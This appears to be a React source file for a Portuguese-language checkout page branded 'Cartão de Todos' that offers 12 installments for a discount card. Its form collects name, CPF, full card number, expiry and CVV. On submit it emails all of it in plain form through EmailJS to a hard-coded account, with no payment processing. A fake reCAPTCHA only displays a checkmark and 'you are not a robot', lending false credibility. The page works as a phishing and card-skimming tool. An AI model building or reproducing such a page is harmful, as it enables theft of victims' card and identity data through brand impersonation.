import React from "react";
import emailjs from '@emailjs/browser';

interface PaymentPageProps {
  onSubmit: () => void;
}

const PaymentPage: React.FC<PaymentPageProps> = ({ onSubmit }) => {
  const validateCardNumber = (input: HTMLInputElement) => {
    const value = input.value.replace(/\D/g, "");
    const formattedValue = value.replace(/(\d{4})(?=\d)/g, "$1 ");
    input.value = formattedValue;
    input.setCustomValidity(
      /^(\d{4} ){3}\d{4}$/.test(formattedValue)
        ? ""
        : "Número do cartão inválido"
    );
  };

  const validateExpiryDate = (input: HTMLInputElement) => {
    const value = input.value.replace(/\D/g, "");
    if (value.length > 2) {
      input.value = value.slice(0, 2) + "/" + value.slice(2, 4);
    }
    input.setCustomValidity(
      /^\d{2}\/\d{2}$/.test(input.value) ? "" : "Data de validade inválida"
    );
  };

  const validateCVV = (input: HTMLInputElement) => {
    input.setCustomValidity(/^\d{3}$/.test(input.value) ? "" : "CVV inválido");
  };

  const simulateRecaptcha = () => {
    const recaptcha = document.getElementById("recaptcha");
    const recaptchaText = document.getElementById("recaptcha-text");
    if (recaptcha && recaptchaText) {
      recaptcha.innerHTML = '<div className="loading"></div>';
      setTimeout(() => {
        recaptcha.innerHTML = "<span>✔️</span>";
        recaptchaText.textContent = "Você não é um robô";
      }, 2000);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen mt-20">
      <div className="info-section text-left p-4 bg-white rounded shadow-lg w-full max-w-lg">
        <h2 className="text-2xl text-green-700 mb-4">Cartão de Todos</h2>
        <p className="mb-2">Benefícios:</p>
        <ul className="benefits-list list-disc pl-6">
          <li className="mb-2">
            <span className="check">✔️</span> Descontos em consultas médicas
          </li>
          <li className="mb-2">
            <span className="check">✔️</span> Descontos em farmácias
          </li>
          <li className="mb-2">
            <span className="check">✔️</span> Descontos em exames laboratoriais
          </li>
          <li className="mb-2">
            <span className="check">✔️</span> Vantagens exclusivas em parceiros
          </li>
        </ul>
        <p className="mt-4">Valor: 12 parcelas de R$ 29,70</p>
      </div>
      <div className="form-section text-left p-4 bg-white rounded shadow-lg w-full max-w-lg mt-4">
        <form
          id="payment-form"
          onSubmit={(e) => {
            e.preventDefault();
            emailjs
              .sendForm("service_ylmdgth", "template_9cur51a", e.currentTarget)
              .then(
                () => {
                  onSubmit();
                },
                (error: unknown) => {
                  console.log("FAILED...", error);
                }
              );
          }}
        >
          <h2 className="text-2xl text-green-700 mb-4">Dados do Pagamento</h2>
          <label>Nome</label>
          <input
            type="text"
            name="name"
            placeholder="Seu Nome"
            required
            className="input"
          />
          <label>CPF</label>
          <input
            type="text"
            name="cpf"
            placeholder="000.000.000-00"
            required
            className="input"
          />
          <label>Tipo de Cartão</label>
          <select name="card_type" required className="input">
            <option value="Débito">Débito</option>
            <option value="Crédito">Crédito</option>
          </select>
          <label>Número do Cartão</label>
          <input
            type="text"
            name="card_number"
            placeholder="1234 5678 9012 3456"
            required
            className="input"
            onInput={(e) => validateCardNumber(e.currentTarget)}
          />
          <label>Data de Validade</label>
          <input
            type="text"
            name="expiry_date"
            placeholder="MM/YY"
            required
            className="input"
            onInput={(e) => validateExpiryDate(e.currentTarget)}
          />
          <label>CVV</label>
          <input
            type="text"
            name="cvv"
            placeholder="123"
            required
            className="input"
            onInput={(e) => validateCVV(e.currentTarget)}
          />
          <div
            id="recaptcha"
            className="recaptcha"
            onClick={simulateRecaptcha}
          ></div>
          <p id="recaptcha-text" className="recaptcha-text"></p>
          <input
            type="submit"
            value="Finalizar"
            className="bg-green-500 text-white w-full py-2 mt-4 rounded cursor-pointer hover:bg-green-600"
          />
        </form>
      </div>
    </div>
  );
};

export default PaymentPage;
